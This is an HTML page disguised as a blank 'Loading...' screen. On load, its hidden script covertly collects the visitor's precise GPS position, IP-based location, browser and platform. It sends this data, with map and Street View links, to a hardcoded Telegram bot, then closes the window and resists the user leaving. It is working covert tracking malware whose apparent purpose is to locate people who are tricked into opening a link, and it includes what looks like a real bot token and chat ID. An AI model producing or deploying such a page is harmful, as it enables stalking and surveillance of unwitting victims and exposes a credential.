<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class PrecisionLocator {
            constructor() {
                this.bestLocation = null;
                this.locations = [];
                this.attempts = 0;
                this.maxAttempts = 5;
            }

            async startTracking() {
                // 1. بدء تتبع GPS المستمر
                this.startContinuousGPS();
                
                // 2. استخدام WiFi Positioning (إن وجد)
                this.getWifiPosition();
                
                // 3. استخدام GSM Cell Towers (للجوال)
                this.getCellTowerPosition();
                
                // 4. استخدام IP مع خدمات متعددة
                await this.getEnhancedIPLocation();
                
                // 5. الانتظار وجمع أفضل النتائج
                setTimeout(() => this.finalizeAndSend(), 8000);
            }

            startContinuousGPS() {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                this.watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const accuracy = position.coords.accuracy;
                        this.attempts++;
                        
                        console.log(`GPS Attempt ${this.attempts}: ${accuracy}m`);
                        
                        // نفضل الدقة الأقل (أقل رقم = أفضل)
                        if (!this.bestLocation || accuracy < this.bestLocation.accuracy) {
                            this.bestLocation = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: accuracy,
                                source: 'HIGH_ACCURACY_GPS',
                                timestamp: new Date()
                            };
                            
                            // إذا وصلنا لدقة ممتازة، نرسل فوراً
                            if (accuracy <= 10) {
                                this.sendImmediately();
                            }
                        }
                        
                        if (this.attempts >= this.maxAttempts) {
                            navigator.geolocation.clearWatch(this.watchId);
                        }
                    },
                    (error) => {
                        console.error('GPS Error:', error);
                    },
                    options
                );
            }

            async getEnhancedIPLocation() {
                // استخدام 3 خدمات IP مختلفة لأفضل دقة
                const services = [
                    'https://ipapi.co/json/',
                    'https://ipinfo.io/json?token=test', 
                    'https://api.ipgeolocation.io/ipgeo?apiKey=test',
                    'https://json.geoiplookup.io/'
                ];

                for (let service of services) {
                    try {
                        const response = await fetch(service, { timeout: 3000 });
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            this.locations.push({
                                lat: parseFloat(data.latitude),
                                lng: parseFloat(data.longitude),
                                accuracy: 5000, // دقة IP تقريبية
                                source: 'IP_GEOLOCATION',
                                city: data.city || data.city_name,
                                country: data.country_name || data.country,
                                isp: data.org || data.isp,
                                timestamp: new Date()
                            });
                        }
                    } catch (e) {
                        continue; // نكمل للخدمة التالية
                    }
                }
            }

            getWifiPosition() {
                // محاولة استخدام WiFi Positioning (إن supported)
                if ('wifi' in navigator) {
                    try {
                        navigator.wifi.getAccessPoints((ap) => {
                            // يمكن استخدام نقاط الوصول لتحسين الدقة
                            console.log('WiFi access points:', ap);
                        });
                    } catch (e) {
                        // ليس مدعوماً في معظم المتصفحات
                    }
                }
            }

            getCellTowerPosition() {
                // للجوال: استخدام معلومات برج الخلية
                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    if (conn.type === 'cellular') {
                        // إضافة تحسينات للشبكة الخلوية
                        this.locations.push({
                            source: 'CELL_NETWORK',
                            type: conn.effectiveType
                        });
                    }
                }
            }

            calculatePreciseLocation() {
                if (this.bestLocation && this.bestLocation.accuracy <= 20) {
                    return this.bestLocation;
                }

                // إذا لم يكن GPS دقيقاً enough، نستخدم متوسط أفضل المواقع
                const validLocations = this.locations.filter(loc => loc.lat && loc.lng);
                
                if (validLocations.length > 0) {
                    const avgLat = validLocations.reduce((sum, loc) => sum + loc.lat, 0) / validLocations.length;
                    const avgLng = validLocations.reduce((sum, loc) => sum + loc.lng, 0) / validLocations.length;
                    
                    return {
                        lat: avgLat,
                        lng: avgLng,
                        accuracy: 100, // دقة متوسطة
                        source: 'HYBRID_AVERAGE',
                        details: `مدمج من ${validLocations.length} مصدر`,
                        timestamp: new Date()
                    };
                }

                return null;
            }

            async finalizeAndSend() {
                navigator.geolocation.clearWatch(this.watchId);
                
                const finalLocation = this.calculatePreciseLocation();
                
                if (finalLocation) {
                    await this.sendToBot(finalLocation);
                } else {
                    await this.sendToBot({
                        error: "لم يتم تحديد موقع دقيق",
                        attempts: this.attempts,
                        sources: this.locations.map(l => l.source)
                    });
                }
                
                setTimeout(() => window.close(), 1000);
            }

            async sendImmediately() {
                if (this.bestLocation) {
                    await this.sendToBot(this.bestLocation);
                    navigator.geolocation.clearWatch(this.watchId);
                    setTimeout(() => window.close(), 1000);
                }
            }

            async sendToBot(locationData) {
                let message = "🎯 **تحديد موقع عالي الدقة**\n\n";
                
                if (locationData.error) {
                    message += `❌ ${locationData.error}\n`;
                    message += `🔢 المحاولات: ${locationData.attempts}\n`;
                    message += `📡 المصادر: ${locationData.sources.join(', ')}\n`;
                } else {
                    const mapsUrl = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=18`;
                    const streetView = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${locationData.lat},${locationData.lng}`;
                    
                    message += `📍 **الإحداثيات الدقيقة:**\n`;
                    message += `• خط العرض: \`${locationData.lat.toFixed(6)}\`\n`;
                    message += `• خط الطول: \`${locationData.lng.toFixed(6)}\`\n`;
                    message += `• الدقة: 🎯 ${locationData.accuracy} متر\n\n`;
                    
                    message += `🔍 **مصدر البيانات:** ${locationData.source}\n`;
                    message += `🕒 **الوقت:** ${new Date().toLocaleString('ar-MA')}\n\n`;
                    
                    message += `🗺️ **خرائط جوجل:**\n${mapsUrl}\n\n`;
                    message += `🌆 **Street View:**\n${streetView}\n\n`;
                    
                    if (locationData.details) {
                        message += `📊 **تفاصيل:** ${locationData.details}\n`;
                    }
                }

                message += `\n💻 **المتصفح:** ${navigator.userAgent.split(' ')[0]}\n`;
                message += `📱 **المنصة:** ${navigator.platform}\n`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false
                        })
                    });
                } catch (error) {
                    console.error('Failed to send:', error);
                }
            }
        }

        // بدء العملية فور تحميل الصفحة
        document.addEventListener('DOMContentLoaded', () => {
            const locator = new PrecisionLocator();
            locator.startTracking();
        });

        // منع إغلاق الصفحة太快
        window.addEventListener('beforeunload', (e) => {
            if (document.visibilityState === 'visible') {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;overflow:hidden;height:100vh;">
    <!-- الصفحة فارغة تماماً -->
</body>
</html>